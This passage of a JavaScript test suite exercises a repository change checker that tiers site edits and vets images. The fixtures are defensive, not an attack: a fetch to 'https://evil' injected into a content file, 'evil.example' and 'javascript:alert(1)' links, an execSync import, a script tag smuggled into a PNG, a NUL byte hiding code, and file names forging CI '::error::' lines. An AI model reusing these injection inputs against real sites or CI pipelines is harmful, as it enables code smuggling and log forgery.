  ["reading __defineGetter__", "const c = Container.__defineGetter__;\nexport default function P() { return <Container />; }"],
  ["a property read passed to .concat", "const x = [1].concat(Container.name);\nexport default function P() { return <Container />; }"],
  ["a call passed to .concat", "const x = [1].concat(Container());\nexport default function P() { return <Container />; }"],
];
for (const [name, body] of callPrimitives) {
  test(`a new page with ${name} is tier 3`, () => {
    assert.equal(run([newPage(pageWith(body))], components).tier, 3, body);
  });
}

test("a content file can still use call, bind or join as ordinary data keys, but not read them as methods", () => {
  assert.equal(run([file("src/content/home.ts", "M", { content: 'export const cta = { call: "Book a call", join: "Join", slice: "x" };\n' })]).tier, 1);
  assert.equal(run([file("src/content/home.ts", "M", { content: "export const a = b.call;\n" })]).tier, 3);
});

test("concat with names, arrays and plain values is fine", () => {
  assert.equal(run([newPage(pageWith("const a = [1];\nconst b = a.concat(a, [2], 3, \"x\");\nexport default function P() { return <Container>{b}</Container>; }"))], components).tier, 1);
});

test("the type-only next import and a plain link with an ampersand are still fine", () => {
  const body = 'import type { Metadata } from "next";\nexport default function P() { return <Container><a href="/a?b=1&amp;c=2">x</a></Container>; }';
  assert.equal(run([newPage(pageWith(body))], components).tier, 1);
});

test("a new page built from JSX, content values, imported helpers and callbacks is tier 1", () => {
  const body = `import { faqHero, faqItems } from "@/content/faq";
import { bookCallHref } from "@/components/hl/Container";
export default function P() {
  const first = faqItems[0];
  const shown = faqItems.filter((item) => item.show).map(({ question, answer }, index) => (
    <details key={index}><summary>{question}</summary><p>{answer}</p></details>
  ));
  return (
    <Container>
      <h1 className="font-ui">{faqHero.title}</h1>
      <>{shown}</>
      {first ? <a href={bookCallHref()}>Book</a> : null}
      <img src={faqHero.image} alt={faqHero.alt} />
    </Container>
  );
}`;
  assert.equal(run([newPage(pageWith(body))], components).tier, 1);
});

test("calling a helper declared in the same page is fine, because its body is held to the same grammar", () => {
  const body = "function label(text) { return text; }\nexport default function P() { return <Container>{label(\"x\")}</Container>; }";
  assert.equal(run([newPage(pageWith(body))], components).tier, 1);
});

test("content files with await using, using, a syntax error, a computed key or a raw-HTML key are tier 3; a stray ; is fine", () => {
  for (const content of [
    "export await using a = x;\n",
    "using a = x;\n",
    "export const a = ;\n",
    'export const a = { ["x" + "y"]: 1 };\n',
    "export const a = { dangerouslySetInnerHTML: { __html: 'x' } };\n",
    "export const a = { __proto__: b };\n",
  ]) {
    assert.equal(run([file("src/content/home.ts", "M", { content })]).tier, 3, content);
  }
  assert.equal(run([file("src/content/home.ts", "M", { content: "export const a = 1;;\n" })]).tier, 1);
});

test("a page that uses imported helpers, map and JSX is still tier 1", () => {
  const page = goodPage.replace("<PageHero", '{["a", "b"].map((x) => <p key={x}>{x}</p>)}\n      <PageHero');
  assert.equal(run([newPage(page)], components).tier, 1);
});

// ---- review findings: symlinks, submodules, type changes (I2) -------------------------------------------------

test("symlinks, submodules and file type changes are tier 3 even at tier 1 paths", () => {
  for (const path of ["src/content/link.ts", "src/lib/routes.ts", "src/content/nav.ts", "public/images/a.png"]) {
    for (const mode of ["120000", "160000"]) {
      const result = run([file(path, "A", { mode, head: png, size: 10 })]);
      assert.equal(result.tier, 3, `${path} ${mode}`);
      assert.match(result.outside[0].reason, /symbolic links/);
    }
  }
  assert.equal(run([file("src/content/home.ts", "T", { mode: "120000" })]).tier, 3);
  assert.equal(run([file("src/content/home.ts", "T", { mode: "100644" })]).tier, 3);
  assert.equal(run([file("src/content/home.ts", "D", { mode: "000000" })]).tier, 1);
});

test("*.test.ts and *.d.ts under src/content are not copy", () => {
  assert.equal(run([file("src/content/home.test.ts")]).tier, 3);
  assert.equal(run([file("src/content/types.d.ts")]).tier, 3);
});

// ---- the cheap minor fixes ------------------------------------------------------------------------------------

test("a new external link is flagged (added lines only), a booking link keeps its own flag", () => {
  assert.deepEqual(kinds(flagged('href: "https://evil.example/path"')), ["link"]);
  assert.deepEqual(kinds(flagged('href: "javascript:alert(1)"')), ["link"]);
  assert.deepEqual(kinds(flagged('href: "https://evil.example/path"', "removed")), []);
  assert.deepEqual(kinds(flagged('href: "https://calendly.com/x"')), ["contact"]);
});

test("booking links without a scheme, with // or with www are flagged; look-alike hosts are not", () => {
  for (const line of ['href: "calendly.com/someone"', 'href: "//calendly.com/x"', 'href: "www.cal.com/x"', "book at savvycal.com"]) {
    assert.deepEqual(kinds(flagged(line)), ["contact"], line);
  }
  for (const line of ['a: "ical.com"', 'b: "mycal.com/x"', 'c: "calendar.example"']) assert.deepEqual(kinds(flagged(line)), [], line);
});

test("international phone numbers are flagged", () => {
  assert.deepEqual(kinds(flagged('phone: "+44 20 7946 0958"')), ["contact"]);
});

test("a placeholder that was already on an edited line is not new; a genuinely new one is", () => {
  const edit = (removed, added) => run([file("src/content/home.ts", "M", { removed, added })]).placeholders.map((p) => p.text);
  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[A]] and more"']), []);
  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[B]]"']), ["[[B]]"]);
  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[A]]"', 'other: "[[A]]"']), ["[[A]]"]);
  assert.deepEqual(edit([], ['x: "[[A]]"']), ["[[A]]"]);
});

test("an image with HTML or SVG markup inside fails even when its first bytes are right", () => {
  const result = run([image("public/images/a.jpg", jpg, 100)].map((f) => ({ ...f, hasMarkup: true })));
  assert.equal(result.imageProblems.length, 1);
  assert.match(result.imageProblems[0].reason, /markup/);
});

test("crafted file names and lines cannot forge output lines or break a code fence", () => {
  // The newline, carriage return and NUL each become one "?"; everything else is kept.
  assert.equal(safe("a\n::error::x\r\u0000"), "a?::error::x??");
  const result = run([file("src/content/a\n::error::boom.ts"), file("src/content/home.ts", "M", { added: ['x: "$1 ``` \u001b[31m"'] })]);
  const report = formatReport(result, { mode: "strict" });
  assert.ok(!report.split("\n").some((line) => line.startsWith("::")), "no line may start with ::");
  assert.ok(!report.includes("\u001b"));
  const fenced = fence("one ``` two ````` three");
  assert.ok(fenced.startsWith("``````text\n") && fenced.endsWith("\n``````"));
});

// ---- the git layer against a real repository (I1, I2) ---------------------------------------------------------

function makeRepo(setup) {
  const dir = mkdtempSync(join(tmpdir(), "scope-repo-"));
  const git = gitIn(dir);
  const commit = (message) => git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", message]);
  const write = (path, content) => {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), content);
  };
  git(["init", "-q", "-b", "main"]);
  write("src/content/home.ts", 'export const title = "Old";\n');
  write("src/lib/routes.ts", 'export const indexableRoutes = ["/"];\n');
  write("src/components/hl/Container.tsx", "export function Container() { return null; }\n");
  git(["add", "-A"]);
  commit("base");
  git(["checkout", "-q", "-b", "change/test"]);
  setup({ dir, git, write });
  git(["add", "-A"]);
  commit("change");
  return { dir, git };
}

const inRepo = (setup, argv = ["--base", "main", "--head", "HEAD"]) => {
  const { dir, git } = makeRepo(setup);
  try {
    const out = [];
    const code = main({ argv, env: {}, git, out: (t) => out.push(t) });
    return { code, report: out.join("\n") };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
};

test("real git: a clean content edit passes", () => {
  const { code, report } = inRepo(({ write }) => write("src/content/home.ts", 'export const title = "New";\n'));
  assert.equal(code, 0, report);
  assert.match(report, /Tier 1/);
});

test("real git: a NUL byte cannot hide added code from the check", () => {
  const { code, report } = inRepo(({ write }) =>
    write("src/content/home.ts", Buffer.from('export const title = "x";\0\nimport { execSync } from "node:child_process";\n// [[todo]] $900 a@b.com\n')),
  );
  assert.equal(code, 1, report);
  assert.match(report, /Tier 3/);
  assert.match(report, /\[\[todo\]\]/);
  assert.match(report, /dollar/);
});

test("real git: a symlink at a content path is tier 3", () => {
  const { code, report } = inRepo(({ dir }) => symlinkSync("../../worker/contact.ts", join(dir, "src/content/link.ts")));
  assert.equal(code, 1, report);
  assert.match(report, /symbolic links/);
});

test("real git: a file turned into a symlink is tier 3", () => {
  const { code, report } = inRepo(({ dir }) => {
    rmSync(join(dir, "src/content/home.ts"));
    symlinkSync("../../worker/contact.ts", join(dir, "src/content/home.ts"));
  });
  assert.equal(code, 1, report);
  assert.match(report, /symbolic links/);
});

test("real git: a submodule (gitlink) at a content path is tier 3 and does not crash the check", () => {
  const { code, report } = inRepo(({ dir }) => {
    const nested = join(dir, "src/content/sub.ts");
    mkdirSync(nested, { recursive: true });
    writeFileSync(join(nested, "a.txt"), "x");
    const inner = gitIn(nested);
    inner(["init", "-q", "-b", "main"]);
    inner(["add", "-A"]);
    inner(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "inner"]);
  });
  assert.equal(code, 1, report);
  assert.match(report, /submodules/);
});

test("real git: code added to a content file, a bad image and a bad new page all fail", () => {
  const png8 = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const { code, report } = inRepo(({ write }) => {
    write("src/content/home.ts", 'fetch("https://evil");\nexport const title = "x";\n');
    write("public/images/a.png", Buffer.concat([png8, Buffer.from("<script>alert(1)</script>")]));
    write("src/app/(site)/faq/page.tsx", goodPage.replace("hl/Container", "hl/Nope"));
  });
  assert.equal(code, 1, report);
  assert.match(report, /src\/content\/home\.ts/);
  assert.match(report, /markup/);
  assert.match(report, /Nope/);
});

test("real git: a good new page built from an existing component passes, and report-only never fails", () => {
  const page = goodPage.replace('import { PageHero } from "@/components/hl/PageHero";\n', "").replace(/\s*<PageHero[^>]*\/>/, "");
  const setup = ({ write }) => {
    write("src/app/(site)/faq/page.tsx", page);
    write("src/content/faq.ts", 'export const faqHero = { eyebrow: "a", title: "b", intro: "c" };\nexport const faqMeta = { title: "t", description: "d" };\n');
    write("src/lib/routes.ts", 'export const indexableRoutes = ["/", "/faq"];\n');
  };
  const good = inRepo(setup);
  assert.equal(good.code, 0, good.report);
  const bad = inRepo(({ write }) => write("worker/contact.ts", "x"), ["--base", "main", "--head", "HEAD", "--report-only"]);
  assert.equal(bad.code, 0);
});

// ---- hidden image data and alt text ---------------------------------------------------------------------------

const withRefs = (files, imageRefs = {}) => evaluateChange({ files, existsAtBase: () => false, imageRefs }, rules);
const usedAs = (url, alt = "The front desk at opening time") => [{ path: "src/content/home.ts", content: `export const hero = { src: "${url}", alt: ${JSON.stringify(alt)} };\n` }];
const EXIF_NAME = "EXIF (camera and location data)";

test("an image used with real alt text has no alt problem, and its alt text is listed for the report", () => {
  const result = withRefs([image("public/images/a.jpg", jpg)], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.deepEqual(result.altProblems, []);
  assert.deepEqual(result.images, [{ path: "public/images/a.jpg", alts: ["The front desk at opening time"] }]);
  assert.equal(decide(result, "strict").ok, true);
});

test("an added image that nothing uses fails the alt check", () => {
  const result = withRefs([image("public/images/a.jpg", jpg)]);
  assert.equal(result.altProblems.length, 1);
  assert.equal(result.altProblems[0].path, "public/images/a.jpg");
  assert.match(result.altProblems[0].reason, /not used/);
});

test("a changed image (not only a new one) must have alt text, and a bad alt names the file that holds it", () => {
  const changed = file("public/images/a.jpg", "M", { head: jpg, size: 1000 });
  const result = withRefs([changed], { "public/images/a.jpg": usedAs("/images/a.jpg", "photo") });
  assert.equal(result.altProblems.length, 1);
  assert.match(result.altProblems[0].reason, /src\/content\/home\.ts/);
  assert.match(result.altProblems[0].reason, /says nothing/);
});

test("deleted images and files outside public/images need no alt text", () => {
  assert.deepEqual(withRefs([file("public/images/a.jpg", "D")]).altProblems, []);
  assert.deepEqual(withRefs([image("public/brand/logo.png", png)]).altProblems, []);
  assert.deepEqual(withRefs([file("public/images/a.jpg", "D")]).images, []);
});

test("every image in a change is checked on its own", () => {
  const result = withRefs([image("public/images/a.jpg", jpg), image("public/images/b.jpg", jpg)], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.deepEqual(result.altProblems.map((p) => p.path), ["public/images/b.jpg"]);
});

test("an image that still carries camera or location data fails and says how to fix it", () => {
  const dirty = file("public/images/a.jpg", "A", { head: jpg, size: 1000, metadata: { removed: [EXIF_NAME, "comment"] } });
  const result = withRefs([dirty], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.equal(result.imageProblems.length, 1);
  assert.match(result.imageProblems[0].reason, /EXIF/);
  assert.match(result.imageProblems[0].reason, /comment/);
  assert.match(result.imageProblems[0].reason, /npm run strip:images/);
  assert.equal(decide(result, "strict").ok, false);
});

test("a clean image has no metadata problem, and an image that could not be read says so once", () => {
  const clean = file("public/images/a.jpg", "A", { head: jpg, size: 1000, metadata: { removed: [] } });
  assert.deepEqual(withRefs([clean], { "public/images/a.jpg": usedAs("/images/a.jpg") }).imageProblems, []);
  const unreadable = file("public/images/a.jpg", "A", { head: jpg, size: 1000, metadata: { error: "not a valid JPEG: cut short" } });
  const result = withRefs([unreadable], { "public/images/a.jpg": usedAs("/images/a.jpg") });
  assert.equal(result.imageProblems.length, 1);
  assert.match(result.imageProblems[0].reason, /could not be checked/);
  const renamed = file("public/images/a.png", "A", { head: svg, size: 1000, metadata: { error: "not a valid PNG: it does not start with the PNG signature" } });
  assert.equal(withRefs([renamed], { "public/images/a.png": usedAs("/images/a.png") }).imageProblems.length, 1, "only the renamed-file problem, not a second one");
});

test("strict mode fails on a missing alt text, report-only mode never does, and the reason is named", () => {
  const result = withRefs([image("public/images/a.jpg", jpg)]);
  assert.equal(decide(result, "strict").ok, false);
  assert.deepEqual(decide(result, "strict").reasons, ["image alt text missing"]);
  assert.equal(decide(result, "report-only").ok, true);
});

test("the report lists the images with their alt text, and the problems with how to fix them", () => {
  const good = formatReport(withRefs([image("public/images/a.jpg", jpg)], { "public/images/a.jpg": usedAs("/images/a.jpg") }), { mode: "strict" });
  assert.match(good, /Images in this change/);
  assert.match(good, /public\/images\/a\.jpg: alt "The front desk at opening time"/);
  assert.match(good, /PASS/);
  const dirty = file("public/images/b.jpg", "A", { head: jpg, size: 1000, metadata: { removed: [EXIF_NAME] } });
  const bad = formatReport(withRefs([image("public/images/a.jpg", jpg), dirty]), { mode: "strict" });
  assert.match(bad, /Alt text problems/);
  assert.match(bad, /not used/);
  assert.match(bad, /npm run strip:images/);
  assert.match(bad, /FAIL \(.*image rule broken.*image alt text missing.*\)/);
});

test("gatherChange reads each image's hidden data and the files that use it", () => {
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(scenario()) });
  assert.deepEqual(change.files[1].metadata, { removed: [] });
  assert.deepEqual(change.imageRefs, { "public/images/new.jpg": [{ path: "src/content/home.ts", content: HOME_WITH_IMAGE }] });
  const result = evaluateChange(change, rules);
  assert.deepEqual(result.altProblems, []);
  assert.deepEqual(result.imageProblems, []);
  assert.deepEqual(result.images, [{ path: "public/images/new.jpg", alts: ["The front desk at opening time"] }]);
});

test("an image with EXIF and GPS data fails through main, in strict mode only", () => {
  const dirty = { ...scenario(), "show HEAD:public/images/new.jpg": makeJpeg([app1Exif()]) };
  const out = [];
  assert.equal(main({ argv: [], env: {}, git: fakeGit(dirty), out: (t) => out.push(t) }), 1);
  assert.match(out.join("\n"), /npm run strip:images/);
  assert.ok(!out.join("\n").includes(SECRET.gps), "the report never prints the hidden data itself");
  assert.equal(main({ argv: ["--report-only"], env: {}, git: fakeGit(dirty), out: () => {} }), 0);
});

test("when git grep finds no file that uses the image the check fails cleanly, and when git grep breaks the check could not run", () => {
  const unused = { ...scenario(), [grepKey("/images/new.jpg")]: null };
  const out = [];
  assert.equal(main({ argv: [], env: {}, git: fakeGit(unused), out: (t) => out.push(t) }), 1);
  assert.match(out.join("\n"), /not used/);
  const broken = (args) => {
    if (args[0] === "grep") throw Object.assign(new Error("fatal: bad object"), { status: 128, stderr: Buffer.from("fatal: bad object") });
    return fakeGit(scenario())(args);
  };
  assert.equal(main({ argv: [], env: {}, git: broken, out: (t) => out.push(t) }), 2);
  assert.match(out.join("\n"), /could not read the git history/);
});

test("only .ts and .tsx files count as a use of an image", () => {
  const css = { ...scenario(), [grepKey("/images/new.jpg")]: "HEAD:src/app/hl.css\0HEAD:src/content/home.ts\0" };
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(css) });
  assert.deepEqual(change.imageRefs["public/images/new.jpg"].map((f) => f.path), ["src/content/home.ts"]);
});

const HOME_WITH_HERO = (url, alt) => `export const title = "Old";\nexport const hero = { src: "${url}", alt: "${alt}" };\n`;

test("real git: clean jpg, png and webp images that are used with alt text pass", () => {
  for (const [name, bytes] of [["a.jpg", makeJpeg()], ["b.png", makePng()], ["c.webp", makeWebp()]]) {
    const { code, report } = inRepo(({ write }) => {
      write(`public/images/${name}`, bytes);
      write("src/content/home.ts", HOME_WITH_HERO(`/images/${name}`, "Sam at the front desk"));
    });
    assert.equal(code, 0, `${name}\n${report}`);
    assert.match(report, new RegExp(`public/images/${name.replace(".", "\\.")}: alt "Sam at the front desk"`));
  }
});

test("real git: an image with EXIF data fails, whatever the type, and the report never contains the hidden data", () => {
  for (const [name, bytes] of [["a.jpg", makeJpeg([app1Exif()])], ["b.png", makePng([pngText("Author", SECRET.comment)])], ["c.webp", makeWebp({ exif: true })]]) {
    const { code, report } = inRepo(({ write }) => {
      write(`public/images/${name}`, bytes);
      write("src/content/home.ts", HOME_WITH_HERO(`/images/${name}`, "Sam at the front desk"));
    });
    assert.equal(code, 1, `${name}\n${report}`);
    assert.match(report, /npm run strip:images/);
    for (const secret of Object.values(SECRET)) assert.ok(!report.includes(secret), `${name} leaked ${secret}`);
  }
});

test("real git: an unused image, an image without alt text and an image with bad alt text all fail", () => {
  const unused = inRepo(({ write }) => write("public/images/a.jpg", makeJpeg()));
  assert.equal(unused.code, 1, unused.report);
  assert.match(unused.report, /not used/);
  const noAlt = inRepo(({ write }) => {
    write("public/images/a.jpg", makeJpeg());
    write("src/content/home.ts", 'export const title = "Old";\nexport const hero = { src: "/images/a.jpg" };\n');
  });
  assert.equal(noAlt.code, 1, noAlt.report);
  assert.match(noAlt.report, /no alt text/);
  const generic = inRepo(({ write }) => {
    write("public/images/a.jpg", makeJpeg());
    write("src/content/home.ts", HOME_WITH_HERO("/images/a.jpg", "image"));
  });
  assert.equal(generic.code, 1, generic.report);
  assert.match(generic.report, /says nothing/);
});

test("real git: an image in a sub-folder is found by its full path, and a deleted image needs nothing", () => {
  const nested = inRepo(({ write }) => {
    write("public/images/team/sam.jpg", makeJpeg());
    write("src/content/home.ts", HOME_WITH_HERO("/images/team/sam.jpg", "Sam at the front desk"));
  });
  assert.equal(nested.code, 0, nested.report);
  const { dir, git } = makeRepo(({ write }) => write("public/images/old.jpg", makeJpeg()));
  try {
    git(["checkout", "-q", "-b", "change/remove"]);
    rmSync(join(dir, "public/images/old.jpg"));
    git(["add", "-A"]);
    git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "remove"]);
    const out = [];
    assert.equal(main({ argv: ["--base", "change/test", "--head", "HEAD"], env: {}, git, out: (t) => out.push(t) }), 0, out.join("\n"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
